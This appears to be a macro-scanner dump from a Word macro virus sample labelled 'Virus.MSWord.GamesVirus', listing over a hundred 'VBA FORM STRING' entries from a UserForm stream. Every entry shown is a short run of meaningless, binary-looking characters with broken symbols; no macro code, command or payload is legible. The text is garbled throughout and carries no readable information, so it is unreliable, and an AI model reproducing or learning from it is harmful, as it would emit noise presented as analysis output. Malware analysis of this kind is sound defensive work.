VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q Ba)Jq2Rq3Zy2Rq4cy<c�2Rq)Ja/9a4cy Ba'9Y"Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I)Ji*Ri2Rq;Zy"Rq)Ji)Ji Ba(Ba3Zy;Zq)Ja)Ji2Rq1Ji(Ba1Ji)Ja)Ji'9Q;Zy3ZqEk�*Ri BY*Ri)Ji(Ba)Ji)Ja1Ji<c�)Ji)Ja)Ji BY(BY)Ja3Zy3Zq)Ji2Rq BY(Ba(Ba)Ja)Ji)Ji1Ji3Zy2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! .10
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*Ri!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY(BQ2Ri)JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ja*Ri2Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BY;Zq3Zq(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq*Rq3Zq*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I79i*Ri*Ri2Rq Ba'9Q BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I)Ja)JY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BQ!Ja!Ja3Zq;Zq3Zy;Zy#Zi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ja)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)JiMk� BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I!Ji2Rq"Rq3Z�3Zy3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q&1Q'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BY*Ri3Zq*Rq BY*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ri BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Jq<cy4cy;Zy;Zi2Ri(BY)Ja3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q(Bq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y!Ji3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q:Ra*Ri*Rq)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY;Zq1Jq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba3Zy Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rq2Rq4cq<c�*Rq(Bi!Ji)Ji Bi3Zq4cq)Ji Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ja2Rq<c�Mk�<cy*Ri BY)Ja3Zq;Zq'9Q)Ja)Ji'9Q'9Q(Ba'9Q BY*Rq BY BY BY<cy1Ji2Rq)Ji BY BY*Ri)Ji)Ja)Ja)Ji3Zq2Rq BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I+Zq)Ja<cy<c�<cy)Ji'9Q BY1Ji(BY)Ja)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(BY)Ja2Rq2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ja BY)Ja'9Q'9Y*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BQ BY2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I BY2Ri;Zq3Zq)Ji(Ba*Ri2Ri!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY!Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BY*Rq4cy'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q)Ja)Ji*Ri*RiDc� Bi(Ba Ba)Ja"Rq*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q/9a BY BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)Ja Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba2R�<c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ji&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q!Jq<cy)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q(Bi3Zq:Ri)Ji'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ji;Zy*Ri BY)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba!Jq+Zy+Zq BY;Za3Zq1Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q4cy4cq'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q Ba=k�<c�2Rq BY Ba3Zq4cy<c�+Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY/9a2Rq*Rq;Zy*Rq Ba)Ja BY Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)Ji*Ri<cy<cy<c�3Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ra)Ji Ba!JiUk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY BY)Ja3Zq)Jq Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ja*Ri*Ri2Ri)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba*Ri3Zq3Zy)Ji)Ji*Ri+Zq2Ri2Rq)Ja(BY)Ji)Ji*Ri3Zy)Ji2Ri)Ji)Ji BY3Z�2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq2Rq)Ji(BY3Zq*Rq*Ri*Ri2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>18$! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!($! Vs�Mk�3Zy!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I&1I'9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y;Zq2Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y Ba)Ja Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y1Ji2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I&1a Ba!Ja&1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ji)Jq*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY'9Q Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q&1Q)Ja3Zq"Ri2Rq)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y!Ja)Ja.1Y)Ja Bi Bi)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ji!Ja)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY Ba(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bi1Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I1Ja3Zq*Ri/9a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)Ja Ba<c�3Zq3Zi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Bi9JqAJq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Ba!Ji2Rq2Rig{�;Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba)Ja!Ji!Ja!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q<cy Ba*Ri2Ri)Ji+Zq!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)Ji1Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba*Rq*Rq4cy3Zy%)Q(Bi*Rq(Ba BY&1Y(Ba(BY BY2Rq+Zq3Zq4c�2Ri(BY)Ja)Ji Ba'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY(Bi)Ji;Zy*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY*Ri2Rq)Ja1Ji BY)Ji<c�(Ba1Jq)Ji2Rq3Zy<c�)Ja)Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q4c�3Zy2Rq)Ji BY2Rq)Ji1Jq)Ji BY)Ji BY;Zy)Ja*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?98798	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"Ri)Ji(BY'9Y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ja(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I'9Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja)Ja"Ri'9Q)Ja2Ra(Ba*RaDcyDcy!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BQ!JY(BY BY!Ja!Ji!Ji)Ji;Zq BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A)Ja<cq&1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q)Ji1Jq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y*Ri3Zq4cy(Bi BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba!Ji)Ji=ky;Zq*Rq2Ry
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bi Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY!JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rq3Zy<c�2Ri(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q Ba3Zy;Zq3Z�<cy<cy3Zy*Ri Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ji2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY)Ji
-------------------------------------------------------------------------------
